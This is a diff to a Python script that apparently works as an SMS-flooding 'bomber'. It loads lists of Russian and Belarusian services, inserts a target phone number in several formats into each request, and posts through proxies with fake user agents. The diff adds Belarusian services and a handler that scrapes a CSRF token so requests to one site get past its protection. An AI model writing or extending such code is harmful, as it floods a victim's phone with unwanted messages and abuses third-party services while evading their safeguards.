@@ -1,15 +1,21 @@
 import json
 import time
 import requests
+from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
 
 # services list
 services_list = []
+services_list_by = []
 with open('tools/services.json') as f:
     services = json.load(f)
-    services = services['ru'][0]
-    for i in services:
+    services_ru = services['ru'][0]
+    for i in services_ru:
         services_list.append(i)
+
+    services_by = services['by'][0]
+    for i in services_by:
+        services_list_by.append(i)
 
 class Send:
     def parse(self):
@@ -95,7 +101,9 @@ class Send:
                 "'": '"',
                 "*+phone*": phone[0],
                 "*phone*": phone[1],
-                "*-phone*": phone[2]
+                "*-phone*": phone[2],
+                "*green*": phone[3],
+                "*sosedi*": phone[4]
             }.items():
                 if old in payload:
                     payload = payload.replace(old, new)
@@ -110,7 +118,7 @@ class Send:
             country = "ru"
 
         # load json
-        with open('tools/services.json') as f:
+        with open('tools/services.json', encoding="utf-8") as f:
             services = json.load(f)
         # Getting services by country
         self.services = services[country][0]
@@ -202,6 +210,16 @@ class Send:
                 r = session.post(url, data=data, timeout=10, proxies=proxy, cookies=cookies, headers=headers)
             elif self.service == "stockmann":
                 r = requests.get(url, timeout=10, proxies=proxy, headers=headers)
+            elif self.service == "green":
+                site = session.get(self.cookie["green"], headers=self.default_headers).text # parse token
+                soup = BeautifulSoup(site, "html.parser")
+                head = soup.find("head")
+                a = []
+                for i in head:
+                    a.append(i)
+                token = str(a[7]).split('"')[1]
+                headers["X-CSRF-TOKEN"] = token
+                r = session.post(url, data, headers=headers, timeout=10, proxies=proxy)
             else:
                 r = session.post(url, json=json_, data=data, timeout=10, proxies=proxy, cookies=cookies, headers=headers)
             if self.response_services[self.service] == "json":
